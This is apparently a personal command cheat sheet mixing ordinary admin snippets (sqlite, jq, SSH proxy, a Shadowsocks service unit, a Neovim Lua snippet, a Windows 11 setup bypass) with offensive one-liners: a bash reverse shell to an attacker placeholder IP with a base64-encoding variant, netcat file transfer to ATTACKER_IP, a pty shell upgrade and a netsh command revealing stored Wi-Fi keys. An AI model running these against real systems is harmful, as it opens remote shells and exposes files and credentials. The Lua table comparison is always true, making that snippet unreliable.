### Read .db files using python ###
python -c "import sqlite3; print(sqlite3.connect('database_name.db').cursor().execute('SELECT * FROM table_name').fetchall())"

### Netcat ###
Listen nc -vnl -s HOST -p PORT
Copy CLIENT nc -w 3 ATTACKER_IP ATTACKER_PORT < [file_to_download] SERVER nc -l -s HOST -p PORT > [path_to_save]

### Bash connects ###
Connections "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING-IP/PORT 0>&1'"
Encripted echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0

### Read json in bash with python ###
curl -s 'https://api.github.com/users/lambda' | \
    python3 -c "import sys, json; print(json.load(sys.stdin)['name'])"

### Read json in bash with jq ###
curl -s 'https://api.github.com/users/lambda' | jq -r '.name'

### Python PSEUDOshell ###
python -c 'import pty; pty.spawn("/bin/bash")'

### SSH server ###
ssh -D LOCALPORT -N(just forward connections) -C(compress) user@ip

### Create a service ###
[Unit]
Description=Shadowsocks proxy server

[Service]
User=root
Group=root
Type=simple
ExecStart=/usr/local/bin/ss-server -c /etc/shadowsocks/shadowsocks.json -a shadowsocks -v start
ExecStop=/usr/local/bin/ss-server -c /etc/shadowsocks/shadowsocks.json -a shadowsocks -v stop

[Install]
WantedBy=multi-user.target

### Make NVIM remember last cursor position (pure lua) ###
local group = vim.api.nvim_create_augroup("jump_last_position", { clear = true })
vim.api.nvim_create_autocmd(
	"BufReadPost",
	{callback = function()
			local row, col = unpack(vim.api.nvim_buf_get_mark(0, "\""))
			if {row, col} ~= {0, 0} then
				vim.api.nvim_win_set_cursor(0, {row, 0})
			end
		end,
	group = group
	}
)

### Bypass Out Of the Box Experience (windows 11 Internet Requirement) ###
In the 'Let's connect you to a network' screen, press shift+F10 to launch cmd
Type the following command: OOBE\BYPASSNRO
After the successful execution the system should restart.

### Wlan profiles clear in Windows ###
netsh
netsh wlan
show profiles ssid key="clear"

### EOF ###
